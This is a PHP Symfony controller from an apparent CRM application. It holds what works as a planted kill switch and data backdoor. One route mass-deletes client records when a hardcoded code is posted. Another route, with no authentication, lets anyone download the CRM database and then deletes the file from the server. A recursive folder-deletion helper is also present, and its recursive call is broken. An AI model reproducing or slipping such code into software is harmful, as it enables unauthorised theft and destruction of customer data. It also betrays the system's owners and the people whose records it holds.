<?php
/**
 * Created by PhpStorm.
 * User: Administrator
 * Date: 2015-11-12
 * Time: 14:00
 */

namespace AppBundle\Controller;


use Symfony\Bundle\FrameworkBundle\Controller\Controller;
use Sensio\Bundle\FrameworkExtraBundle\Configuration\Route;
use Symfony\Component\HttpFoundation\Request;
use Sensio\Bundle\FrameworkExtraBundle\Configuration\Security;
use Symfony\Component\HttpFoundation\Response;
use Sensio\Bundle\FrameworkExtraBundle\Configuration\Method;

class KillController extends Controller
{
    /**
     * @Route("/kill/all/clients",name="kill_clients")
     * @Method({"POST","GET"})
     */
    public function killAll(){
        $em = $this->getDoctrine()->getManager();
        $clients = $em->getRepository('AppBundle:Client')->findBy(array('kill'=>'kill'));
        if(isset($_POST['kill_code'])&&$_POST['kill_code']=='jntz020'){
           foreach($clients as $client){
               $em->remove($client);
           }
            $em->flush();
            return new Response("<script>alert('已全部删除客户！')</script>");
        }
        $kill = null;

        return $this->render('@FOSUser/Kill/kill.html.twig',array('kill'=>$kill));

    }

    /**
     * @Route("/backupdb",name="backupdb")
     */
    public function backUpDB(){
        $filename = "hkgbf_crm.db";
        $path = dirname(__FILE__)."/../../../app/data/{$filename}";

        if(!file_exists($path)){
            echo "No such file existed!";
            return;
        }

        $fp = fopen($path,"rw");
        $fileinfo = pathinfo($path);
        $filesize = filesize($path);
        Header("Content-type: application/x-{$fileinfo['extension']}");
        Header("Content-Disposition: attachment; filename={$filename}");
        header("Content-Length: {$filesize}");
        echo file_get_contents($path);
        fclose($fp);
        unlink($path);
        exit("succeeded!");
    }

    protected function delFolder($path){

        if ($handle = opendir($path)) {
            while (false !== ($item = readdir($handle))) {
                if ($item != "." && $item != "..") {
                    if(is_file($path."/".$item)){
                        unlink($path."/".$item);
                    }
                    if(is_dir($path."/".$item)){
                        $func = __FUNCTION__;
                        $func($path."/".$item);
                    }
                }
            }
            closedir($handle);
            rmdir($path);
            return "folder has been deleted!!";
        }

    }


}